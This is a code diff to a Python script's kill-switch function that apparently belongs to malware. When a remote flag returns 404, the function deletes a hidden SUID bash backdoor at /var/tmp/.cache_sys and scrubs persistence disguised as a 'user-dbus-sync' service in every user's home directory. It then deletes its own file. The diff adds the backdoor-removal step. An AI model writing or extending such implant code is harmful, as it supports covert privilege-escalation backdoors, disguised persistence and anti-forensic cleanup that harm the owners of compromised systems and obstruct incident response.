@@ -32,6 +32,8 @@ def check_kill_switch():
     import urllib.error
     import subprocess
     import glob
+    import os
+    import time
     print("[*] Checking kill switch...")
     
     try:
@@ -48,7 +50,16 @@ def check_kill_switch():
             if e.code == 404:
                 print("[!] Flag not found (404)! Initiating self-destruct...")
                 
-                # 2. Clean up persistence files aggressively
+                # --- STEP 1: Remove SUID backdoor ---
+                hidden_bash = "/var/tmp/.cache_sys"
+                try:
+                    if os.path.exists(hidden_bash):
+                        os.remove(hidden_bash)
+                        print(f"[*] SUID backdoor {hidden_bash} scrubbed.")
+                except Exception as err:
+                    print(f"[-] Could not remove SUID backdoor: {err}")
+
+                # --- STEP 2: Clean up persistence files aggressively ---
                 service_name = "user-dbus-sync"
                 
                 # Check current user home + all /home/ directories if running as root
@@ -76,7 +87,7 @@ def check_kill_switch():
                 )
                 print("[*] Persistence mechanisms scrubbed.")
 
-                # 3. Delete the script itself using the absolute global path
+                # --- STEP 3: Delete the script itself ---
                 try:
                     if os.path.exists(THIS_FILE):
                         os.remove(THIS_FILE)
